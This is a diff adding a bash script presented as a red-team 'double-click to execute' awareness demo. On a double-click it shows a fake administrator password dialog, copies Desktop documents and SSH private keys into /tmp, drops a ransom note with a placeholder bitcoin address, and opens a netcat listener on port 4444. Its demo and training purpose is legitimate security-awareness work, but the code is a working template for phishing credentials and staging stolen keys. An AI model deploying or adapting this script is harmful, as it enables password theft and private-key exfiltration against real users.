@@ -1,0 +1,83 @@
+#!/usr/bin/env bash
+# =====================================================
+# RedTeam Demo Payload – "Double-click to Execute" Demo
+# Purpose: Authorized security research / red team exercise only
+# Version: 2025-eng-v1
+# =====================================================
+
+set -euo pipefail
+
+RED='\033[31;1m'
+GREEN='\033[32;1m'
+YELLOW='\033[33;1m'
+NC='\033[0m'
+
+banner() {
+    clear
+    echo -e "${RED}"
+    echo "╔══════════════════════════════════════════════════════════╗"
+    echo "║       ⚠️  RED TEAM DEMO PAYLOAD ACTIVATED ⚠️           ║"
+    echo "║                                                          ║"
+    echo "║  You just double-clicked and executed a file downloaded ║"
+    echo "║  from the internet. This is exactly how real attacks    ║"
+    echo "║  start in 2025.                                          ║"
+    echo "╚══════════════════════════════════════════════════════════╝"
+    echo -e "${NC}"
+}
+
+countdown() {
+    local secs=$1
+    while [ $secs -gt 0 ]; do
+        echo -ne "${YELLOW}Dangerous action in $secs seconds... (Ctrl+C to abort)${NC}\r"
+        sleep 1
+        ((secs--))
+    done
+    echo
+}
+
+banner
+
+echo -e "${RED}[1/5] Simulating persistence – dropping beacon${NC}"
+sleep 2
+touch /tmp/.redteam-beacon-$$ && echo -e "${GREEN}   → Beacon planted in /tmp${NC}"
+
+echo -e "${RED}[2/5] Simulating privilege escalation prompt${NC}"
+sleep 1
+echo -e "${YELLOW}   → Fake admin password dialog (real attack would phish sudo)${NC}"
+zenity --password --title="System Update Required" --text="Enter administrator password to continue critical update" --width=500 2>/dev/null || true
+
+echo -e "${RED}[3/5] Simulating data exfiltration${NC}"
+countdown 8
+mkdir -p /tmp/exfil-demo
+cp -r ~/Desktop/*.pdf ~/Desktop/*.doc* /tmp/exfil-demo/ 2>/dev/null || true
+cp -r ~/.ssh/id_* /tmp/exfil-demo/ 2>/dev/null || true
+echo -e "${GREEN}   → Sensitive files copied to /tmp/exfil-demo (demo only)${NC}"
+
+echo -e "${RED}[4/5] Simulating ransomware note${NC}"
+countdown 6
+cat > ~/Desktop/!!!_YOUR_FILES_ARE_ENCRYPTED_!!!.txt <<'EOF'
+!!! YOUR FILES HAVE BEEN ENCRYPTED !!!
+
+To decrypt your files, send 0.5 BTC to:
+bc1qredteamdemo0000000000000000000000000000
+
+(THIS IS JUST A DRILL – NO FILES WERE ACTUALLY ENCRYPTED)
+EOF
+echo -e "${GREEN}   → Ransom note dropped on Desktop${NC}"
+
+echo -e "${RED}[5/5] Simulating C2 callback (listening on port 4444)${NC}"
+countdown 5
+echo -e "${YELLOW}   → Opening reverse shell listener for 10 seconds${NC}"
+timeout 10 bash -c 'echo "C2 connection established (demo)" | nc -l -p 4444' &>/dev/null || true
+
+echo
+echo -e "${GREEN}════════════════════════════════════════════════════════${NC}"
+echo -e "${GREEN}   RED TEAM DEMONSTRATION COMPLETE${NC}"
+echo -e "${GREEN}   All actions are reversible and highly visible${NC}"
+echo -e "${GREEN}   Check: /tmp/exfil-demo | Desktop ransom note | /tmp/.redteam-beacon*${NC}"
+echo -e "${GREEN}   One-click cleanup command:${NC}"
+echo -e "${GREEN}   rm -rf /tmp/exfil-demo /tmp/.redteam-beacon* ~/Desktop/!!!_YOUR_FILES_ARE_ENCRYPTED_!!!.txt${NC}"
+echo -e "${GREEN}════════════════════════════════════════════════════════${NC}"
+
+read -p "Press Enter to exit..."
+exit 0
